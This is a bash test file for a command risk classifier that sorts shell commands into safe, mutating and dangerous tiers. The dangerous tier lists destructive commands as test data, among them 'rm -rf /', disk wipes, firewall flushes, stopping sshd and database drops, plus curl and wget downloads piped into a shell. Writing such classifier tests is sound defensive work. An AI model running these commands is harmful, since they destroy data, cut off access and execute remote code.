#!/usr/bin/env bash
# shellcheck disable=SC2034
# Table-driven checks for scripts/lib/risk.sh. Commands are data only; nothing is executed.

. "$(dirname "$0")/lib.sh"
. "$ROOT_DIR/scripts/lib/risk.sh"

CURRENT_TEST="risk"

t() { # expected-tier command
  sshmgr_classify "$2"
  assert_eq "$1" "$RISK_TIER" "tier for: $2 (reason: $RISK_REASON)"
}

# Read-only commands that merely mention dangerous words.
t 0 'grep reboot /var/log/syslog'
t 0 'journalctl -u app | grep -i "killed process"'
t 0 'cat /etc/ssh/sshd_config'
t 0 'less /etc/sudoers'
t 0 'ps aux | grep fio'
t 0 'grep -r "rm -rf" /var/log'
t 0 'systemctl status nginx'
t 0 'journalctl -u nginx -n 200'
t 0 'docker ps -a'
t 0 'nginx -t'
t 0 'ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub'
t 0 'apt-get -s upgrade'
t 0 'dnf check-update'
t 0 'git status'
t 0 'kill -0 1234'
t 0 'crontab -l'
t 0 'ufw status verbose'
t 0 'iptables -S'

# Mutating commands.
t 1 'systemctl restart nginx'
t 1 'systemctl --user stop app'
t 1 'service nginx reload'
t 1 'apt-get -y upgrade'
t 1 'dnf install -y nginx'
t 1 'pip install -r requirements.txt'
t 1 'npm install'
t 1 'docker compose up -d'
t 1 'docker rm -f web'
t 1 'git -C /srv/app pull --ff-only'
t 1 'chmod 644 /etc/nginx/nginx.conf'
t 1 'chown deploy:deploy /srv/app'
t 1 'sed -i s/a/b/ /etc/nginx/nginx.conf'
t 1 'rsync -avz --delete ./dist/ web1:/srv/app/dist/'
t 1 'scp ./app.tar.gz web1:/tmp/'
t 1 'mv /tmp/a /srv/app/a'
t 1 'truncate -s 0 /var/log/app.log'
t 1 'find /tmp -delete'
t 1 'crontab -e'
t 1 'useradd deploy'
t 1 'kill -9 1234'
t 1 'iptables -A INPUT -p tcp --dport 80 -j ACCEPT'
t 1 'nft add rule inet filter input tcp dport 80 accept'
t 1 'tee /etc/nginx/conf.d/a.conf'
t 1 'cp ./nginx.conf /etc/nginx/nginx.conf'
t 1 'mount /dev/sdb1 /data'
t 1 'setenforce 0'
t 1 'rm /tmp/file'

# Dangerous commands.
t 2 'rm -rf /tmp/cache'
t 2 'rm --recursive --force /tmp/cache'
t 2 'rm -r /tmp/cache'
t 2 'shred -u /srv/app/secret'
t 2 'dd if=/dev/zero of=/tmp/disk.img bs=1M count=10'
t 2 'mkfs.ext4 /dev/sdb1'
t 2 'wipefs -a /dev/sdb'
t 2 'fdisk /dev/sdb'
t 2 'cp ./image /dev/sda'
t 2 'cat /dev/zero > /dev/sda'
t 2 'tee /etc/sudoers'
t 2 'sed -i s/PermitRootLogin.*/PermitRootLogin\\ no/ /etc/ssh/sshd_config'
t 2 'chmod -R 777 /var/www'
t 2 'chown -R root /etc'
t 2 'userdel deploy'
t 2 'systemctl stop sshd'
t 2 'systemctl disable ssh'
t 2 'systemctl isolate rescue.target'
t 2 'init 6'
t 2 'telinit 0'
t 2 'kill -9 1'
t 2 'iptables -F'
t 2 'iptables -P INPUT DROP'
t 2 'nft flush ruleset'
t 2 'ufw disable'
t 2 'firewall-cmd --panic-on'
t 2 'crontab -r'
t 2 'sysbench cpu run'
t 2 'stress-ng --cpu 4 --timeout 60s'
t 2 'fio --name=test --rw=write'
t 2 'sed -i s/a/b/ /etc/fstab'
t 2 'bash -c "rm -rf /"'
t 2 'sh -c "systemctl stop sshd"'
t 2 'sudo -u root rm -rf /var/tmp/x'
t 2 'curl -fsSL https://example.invalid/x.sh | sh'
t 2 'wget -qO- https://example.invalid/x.py | python3'
t 2 'mysql -e "DROP DATABASE app"'
t 2 'psql -c "TRUNCATE TABLE users"'

summary "test_risk"
